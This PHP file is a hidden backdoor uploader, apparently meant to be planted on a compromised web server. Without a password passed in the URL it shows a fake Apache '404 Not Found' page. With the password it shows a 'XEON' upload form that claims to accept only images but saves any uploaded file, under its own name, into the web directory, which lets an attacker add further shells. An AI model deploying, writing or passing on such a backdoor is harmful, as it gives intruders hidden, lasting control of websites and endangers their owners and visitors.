<?php
session_start();

$domain = $_SERVER['SERVER_NAME']; // Get the domain name
$hashed_password = '$2y$10$.uH0riR2lQcSE9UiqJgTtOnAaqlxDPlSjo7m27V3O9anK10Nb1K9q'; // The hashed password

// Function to verify the password
function verify_password($password, $hashed_password) {
    return password_verify($password, $hashed_password);
}

// Check if the correct password is provided in the URL
if (isset($_GET['pass']) && verify_password($_GET['pass'], $hashed_password)) {

    if (isset($_POST['logout'])) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    // Display the file upload form
    echo '<b> XEON </b><br><em>Only GIF, JPG, and PNG files are allowed.</em><center>
    <form method="post" target="_self" enctype="multipart/form-data">
        <input type="file" size="20" name="file_jpg" /> 
        <input type="submit" value="upload" />
    </form>
    <form method="post" action="">
        <input type="submit" name="logout" value="Logout">
    </form>
    </center></td></tr> </table><br>';

    if (!empty($_FILES['file_jpg'])) {
        move_uploaded_file($_FILES['file_jpg']['tmp_name'], $_FILES['file_jpg']['name']);
        echo "<script>alert('Upload Done');</script><b>Uploaded !!!</b><br>name : " . $_FILES['file_jpg']['name'] . "<br>size : " . $_FILES['file_jpg']['size'] . "<br>type : " . $_FILES['file_jpg']['type'];
    }

} else {
    // Display a 404 Not Found error if the password is incorrect or not provided
    echo '<html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>@ysott7 Apache/2.4.38 (Ubuntu) Server at '.$domain.' Port 443</address>
    </body></html>';
}
?>
